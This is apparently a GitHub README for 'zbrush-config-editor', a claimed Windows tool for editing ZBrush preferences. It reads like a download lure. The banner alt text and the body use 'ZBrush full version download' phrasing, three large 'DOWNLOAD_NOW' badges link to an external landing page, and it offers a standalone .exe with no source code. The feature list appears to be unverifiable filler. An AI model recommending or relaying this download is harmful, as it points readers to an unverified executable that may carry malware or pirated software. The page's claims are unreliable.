<div align="center">

<img src="assets/banner.svg" width="100%" alt="ZBrush Full Version Download banner"/>

# zbrush-config-editor 🗿⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A configuration layer for ZBrush that turns a stock install into a sculptor's cockpit.*

<p align="center">
  <a href="https://WoodPathEdge.github.io/zbrush-config-editor/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 🧭 Overview

ZBrush ships with decades of accumulated tooling — brushes, hotkeys, matcaps, UI panels — bolted onto a workflow that was never designed for casual tuning. Most artists inherit whatever config state their install happened to land in, and never touch it again because the underlying `.txt` and `.zsc` preference files are cryptic, order-sensitive, and unforgiving of typos. **zbrush-config-editor** exists to close that gap: it's a standalone Windows utility that reads, validates, and rewrites ZBrush's configuration surface without ever asking you to hand-edit a plaintext file at 2am before a deadline.

This project sits downstream of the **ZBrush full version download** process itself — once you've obtained and installed the application, this tool becomes the thing that makes the install actually *yours*. It manages startup preferences, custom UI layouts, brush palette ordering, memory/undo allocation, and plugin registration paths, all through a single interface instead of scattered menus buried three clicks deep. Studios running multiple seats use it to keep configs consistent across machines; solo artists use it to stop losing their setup every time they reinstall or move to a new rig.

Who is this for? Technical artists who treat their tool like an instrument, pipeline TDs who need reproducible ZBrush environments across a team, and anyone who's ever lost a perfectly tuned workspace because a preferences file got silently overwritten. If you've never thought about your ZBrush config at all — that's fine too, the defaults are sane, and the editor just gives you the door when you're ready to walk through it.

<p align="center">

<a href="https://WoodPathEdge.github.io/zbrush-config-editor/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
</a>

</p>

> [!NOTE]
> The landing page above hosts the current 2026 build. There are no mirrors, no torrents, no alternate hosts — one source, kept current.

---

## 🔥 What It Actually Does

- **Preference archaeology** — scans existing ZBrush install directories and maps out which config files are active, stale, or duplicated across versions, so you're not guessing what's live.

- **Hotkey remapping without collisions** — assigns custom keyboard shortcuts and flags conflicts *before* you save, instead of letting ZBrush silently pick a winner.

- **Brush palette curation** — reorders, hides, and groups brush sets so your most-used tools sit one keystroke away instead of buried in a scroll list.

- **UI layout snapshots** — saves and restores full interface arrangements (palettes, docks, panel positions) as portable profiles you can carry between machines.

- **Memory & undo tuning** — exposes the allocation sliders ZBrush hides in obscure menus, with sane presets for low-RAM and high-poly sculpting sessions.

- **Plugin path management** — registers and deregisters plugin directories cleanly, avoiding the "phantom plugin still loads" problem after a reinstall.

- **Config diffing** — compares two saved profiles side by side, highlighting exactly what changed, useful when troubleshooting a machine that "used to work."

- **One-click revert** — every change is snapshotted, so a bad edit is one button away from undone — no manual file surgery required.

> [!TIP]
> Export your tuned profile *before* any major ZBrush update. Config schemas shift between versions, and a saved profile is your insurance policy.

---

## 🚀 Getting Started

1. Visit the landing page via the download button and grab the current release.
2. Run the standalone `.exe` — no installer wizard, no bundled extras.
3. Point it at your existing ZBrush install folder (auto-detected in most cases).
4. Tune, save, and relaunch ZBrush to see changes take effect.

> [!IMPORTANT]
> This tool edits configuration and preference data only. It does not modify, patch, or redistribute the ZBrush application binary itself.

---

## 🖥️ System Requirements

| Requirement | Minimum |
|---|---|
| OS | Windows 10 (64-bit) |
| OS | Windows 11 (64-bit) |
| Dependencies | None — fully standalone |
| Disk space | ~40 MB |
| ZBrush install | Any version with accessible config directory |

![Standalone](https://img.shields.io/badge/build-standalone-informational?style=flat-square) ![No Deps](https://img.shields.io/badge/dependencies-none-success?style=flat-square) ![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)

---

<details>
<summary><strong>⚙️ How It Works — Architecture Deep Dive</strong></summary>

The editor operates as a thin, stateless layer above ZBrush's own file format — it never talks to ZBrush at runtime, and ZBrush never knows the editor exists. That separation is deliberate: no runtime hooks, no memory injection, no fragile inter-process dependency. The flow is straightforward:

1. **Detect** — locate the active ZBrush preferences directory.
2. **Parse** — read config, hotkey, and layout files into an in-memory model.
3. **Edit** — apply user changes to the model, validating as it goes.
4. **Snapshot** — write a backup of the previous state before touching disk.
5. **Commit** — flush the updated model back to the original file locations.

```mermaid
flowchart LR
    Detect --> Parse
    Parse --> Edit
    Edit --> Snapshot
    Snapshot --> Commit
```

Because every write is preceded by a snapshot, the worst-case outcome of a bad edit is a one-click rollback — not a corrupted install requiring a full reinstall.

</details>

---

## 🩹 Troubleshooting

<details>
<summary><strong>The editor can't find my ZBrush install directory.</strong></summary>

Point it manually via the folder picker — this usually happens with non-default install paths or portable setups.

</details>

<details>
<summary><strong>My hotkeys reverted after a ZBrush update.</strong></summary>

Updates sometimes reset preference files. Re-apply your saved profile — this is exactly what snapshots are for.

</details>

<details>
<summary><strong>UI layout didn't restore correctly.</strong></summary>

Ensure ZBrush is fully closed before restoring a layout snapshot; live file locks can cause partial writes.

</details>

<details>
<summary><strong>Brush palette order looks scrambled after import.</strong></summary>

Profiles are version-tagged. Importing a profile from a different ZBrush build may need a re-sort pass — run the built-in normalize step.

</details>

<details>
<summary><strong>Does this affect my ZBrush license or activation?</strong></summary>

No. This tool never touches licensing, activation, or account data — strictly config and preferences.

</details>

> [!WARNING]
> Always close ZBrush before editing config files directly on disk. Concurrent writes from two processes is the single most common source of corrupted preferences.

---

## 🎨 Interface & Personalization

- **Themes** — Light, Dark, and a low-glare "Studio Night" mode for long sessions.
- **Keyboard shortcuts** — fully remappable inside the editor itself (`Ctrl+S` save profile, `Ctrl+Z` revert last change, `Ctrl+D` diff profiles).
- **Settings persistence** — the editor remembers its own window state and last-used ZBrush directory between sessions.
- **Compact mode** — collapses side panels for smaller displays or secondary monitors.

---

## 🤝 Contributing & Community

> [!TIP]
> Found a config edge case that breaks a specific ZBrush version? Open an issue with your ZBrush build number — version-specific quirks are the most valuable bug reports we get.

Pull requests, issue reports, and profile-sharing discussions are welcome. This project grows through real studio and solo-artist usage — if you've built a workflow around it, tell us what's missing.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026.

---

## ⚠️ Disclaimer

This is an independent, community-built configuration utility. It is not affiliated with, endorsed by, or officially connected to Maxon or the ZBrush development team. "ZBrush" is the property of its respective owner. This tool manages local configuration data only.

<p align="center">

<a href="https://WoodPathEdge.github.io/zbrush-config-editor/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-9333EA?style=for-the-badge&logo=windows&logoColor=white&labelColor=7E22CE" width="550" alt="Download"/>
</a>

</p>